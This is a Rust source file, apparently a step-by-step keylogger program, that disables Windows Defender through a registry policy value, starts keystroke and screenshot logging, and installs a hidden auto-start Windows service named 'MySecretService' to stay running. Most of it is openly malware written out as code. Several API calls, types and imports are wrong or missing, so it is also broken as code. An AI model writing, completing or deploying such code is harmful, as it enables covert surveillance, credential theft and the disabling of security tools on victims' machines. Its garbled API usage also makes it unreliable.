use win32api::{RegOpenKeyExA, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, DWORD, RegSetValueExA, REGDWORD, RegCloseKey};
use win32api::shared::windef;
use tao::*;
use tao::{Tao, KeyloggerConfig, hook::YourSpecificItem};

fn main() {
    // Step 2: Bypass Windows Security
    unsafe {
        // Disable Windows Defender
        let mut reg_key = RegOpenKeyExA(
            HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Policies\Microsoft\Windows Defender",
            0,
            KEY_ALL_ACCESS,
        );
        let value: DWORD = 0;
        RegSetValueExA(reg_key, "DisableAntiSpyware", 0, REGDWORD, &value as *const _ as *mut _, 4);
        RegCloseKey(reg_key);
    }

    // Step 3: Deploy the TAO Logger
    let mut tao = Tao::new();
    tao.add_keylogger(KeyloggerConfig::default());
    tao.add_screenshot_logger(ScreenshotLoggerConfig::default());

    // Step 4: Achieve "Always Run" Status
    unsafe {
      let service_name = CString::new("MySecretService").unwrap().into_raw();
        let display_name = CString::new("My Secret Service").unwrap().into_raw();
        let service_type = SERVICE_WIN32_OWN_PROCESS;
        let start_type = SERVICE_AUTO_START;
        let error_control = SERVICE_ERROR_NORMAL;
        let binary_path_name = CString::new(r"C:\path\to\your\service.exe").unwrap().into_raw();
        let load_order_group = 0;
        let dependencies = 0;
        let service_start_name = 0;
        let password = 0;
        CreateService(
            0,
            service_name,
            display_name,
            SERVICE_ALL_ACCESS,
            service_type,
            start_type,
            error_control,
            binary_path_name,
            load_order_group,
            dependencies,
            service_start_name,
            password,
        );
        StartService(0, service_name, 0);
    }

    // Start the logger
    tao.start();
}
